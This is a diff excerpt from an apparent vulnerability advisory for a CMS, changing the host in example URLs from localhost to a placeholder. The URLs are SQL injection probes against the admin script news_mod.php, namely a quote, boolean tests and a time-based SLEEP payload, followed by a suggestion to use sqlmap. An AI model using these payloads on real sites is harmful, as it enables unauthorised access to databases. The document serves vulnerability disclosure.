@@ -17,9 +17,9 @@ affected reason:
 --------------------------------
 affected executable: 
   Like this: 
-             http://127.0.0.1/cms/5/admin/news/news_mod.php?id=1'
-             http://127.0.0.1/cms/5/admin/news/news_mod.php?id=1 and 1=1
-             http://127.0.0.1/cms/5/admin/news/news_mod.php?id=1 and 1=2
-             http://127.0.0.1/cms/5/admin/news/news_mod.php?id=1 RLIKE SLEEP(2)
+             http://xx.xx.com/cms/5/admin/news/news_mod.php?id=1'
+             http://xx.xx.com/cms/5/admin/news/news_mod.php?id=1 and 1=1
+             http://xx.xx.com/cms/5/admin/news/news_mod.php?id=1 and 1=2
+             http://xx.xx.com/cms/5/admin/news/news_mod.php?id=1 RLIKE SLEEP(2)
              
 Then, we can use tools like sqlmap for more information.
